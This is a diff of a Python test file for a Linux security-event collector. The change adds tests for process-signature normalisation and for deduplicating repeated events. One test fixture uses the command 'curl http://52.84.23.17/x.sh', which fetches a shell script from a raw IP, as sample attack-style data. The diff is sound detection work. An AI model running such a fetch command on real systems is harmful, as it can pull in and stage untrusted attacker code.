@@ -4,7 +4,8 @@ import sys
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from sources_linux import (
-    is_internal, map_audit_execve, map_auth, map_conntrack, map_proc, map_sudo,
+    _Deduper, is_internal, map_audit_execve, map_auth, map_conntrack, map_proc,
+    map_sudo, proc_signature,
 )
 
 TS = "2026-07-08T12:00:00+00:00"
@@ -68,6 +69,23 @@ def test_map_proc():
     assert d["event_type"] == "process" and d["source"] == "linux-proc"
     assert d["dest_entity"] == "curl http://52.84.23.17/x.sh"
     assert d["source_entity"] == "alice" and "4242" in d["raw"]
+
+
+def test_proc_signature_collapses_pids():
+    # VS Code's cpuUsage.sh takes a changing pid arg — same signature
+    a = proc_signature("osiris", "/bin/bash /usr/share/code/.../cpuUsage.sh 12345")
+    b = proc_signature("osiris", "/bin/bash /usr/share/code/.../cpuUsage.sh 67890")
+    assert a == b
+    assert proc_signature("osiris", "sleep 1") != proc_signature("osiris", "whoami")
+
+
+def test_deduper_suppresses_repeats_within_ttl():
+    d = _Deduper(ttl=60)
+    assert d.fresh("osiris|sleep #", now=1000.0) is True     # first sighting ships
+    assert d.fresh("osiris|sleep #", now=1001.0) is False    # 1s later — suppressed
+    assert d.fresh("osiris|sleep #", now=1005.0) is False
+    assert d.fresh("osiris|sleep #", now=1061.0) is True     # past the window — ships again
+    assert d.fresh("osiris|whoami", now=1002.0) is True      # a different command is never suppressed
 
 
 def test_is_internal():
